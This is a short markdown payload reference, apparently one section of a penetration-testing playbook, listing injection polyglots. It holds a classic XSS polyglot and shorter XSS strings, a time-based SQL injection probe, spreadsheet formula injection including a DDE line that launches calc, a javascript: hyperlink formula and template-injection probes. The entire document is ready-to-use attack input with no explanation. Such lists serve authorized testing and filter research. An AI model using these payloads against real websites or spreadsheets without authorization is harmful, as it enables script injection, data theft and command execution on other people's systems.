# PAYLOADS — Polyglots

> Moved from payloads/SKILL.md during the 2026-09-19 playbook split. Load on demand only.

## 13. Polyglots

### CLASSIC XSS POLYGLOT (0xSobky)
```
jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
```

### SHORTER POLYGLOTS
```
"><svg/onload=alert(1)>'-alert(1)-'

/*</style></script>"><svg onload=alert(1)>

';alert(1)//\\";alert(1)//"-prompt(1)//\\"-prompt(1)//<svg/onload=alert(1)>
```

### SQLI / COMBO / CSV / SSTI / XSS+REDIRECT
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/

'-alert(1)-'<svg/onload=alert(1)>

=cmd|'/c calc'!A1
@SUM(1+1)
=HYPERLINK("javascript:alert(1)","Click")

${{<%[%'"}}%\\
${7*7}{{7*7}}<%=7*7%>#{7*7}*{7*7}@{7*7}

javascript:/*--></title></style></textarea></script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---
